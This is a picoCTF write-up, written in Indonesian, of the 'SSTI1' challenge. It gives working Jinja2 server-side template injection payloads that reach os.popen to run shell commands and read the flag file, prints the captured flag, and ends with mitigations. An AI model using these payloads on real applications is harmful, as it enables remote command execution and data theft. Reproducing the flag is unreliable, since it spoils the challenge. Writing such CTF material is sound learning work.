# picoCTF – “SSTI1” (Web Exploitation)

**Hint:** SSTI (Server-Side Template Injection)
**URL:** `http://rescued-float.picoctf.net:58489/`

## Recon

* Input pada fitur “announce” direfleksikan kembali ke halaman.
* Uji SSTI:

  * Kirim `{{7*7}}` → jika merender `49`, berarti Jinja2 (Python).
  * Kirim `{{request}}` → server menampilkan `<Request '...'>`, memastikan objek `request` tersedia di konteks template.

## Exploit

Manfaatkan akses ke objek global melalui Jinja2 untuk memanggil perintah sistem (RCE ringan) dan membaca file flag.

Payload final:

```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
```

Jika perlu enumerasi:

```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}
```

Alternatif path:

```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```

## Result

Server mengembalikan:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}
```

## Root Cause

Aplikasi merender input pengguna sebagai *template* Jinja2, sehingga ekspresi `{{ ... }}` dievaluasi. Dari objek yang terekspos (`request`), kita bisa merantai ke `application.__globals__` → `__builtins__` → `__import__('os')` → `popen()` untuk menjalankan perintah shell.

## Mitigasi

* **Jangan** merender input user sebagai template.
* Gunakan engine yang **hanya** melakukan substitusi string, atau aktifkan *sandbox* ketat.
* Nonaktifkan akses ke `__globals__`, builtins, dan filter berbahaya.
* Escape output (`{{ ... }}` → teks literal) dan lakukan validasi/whitelist.
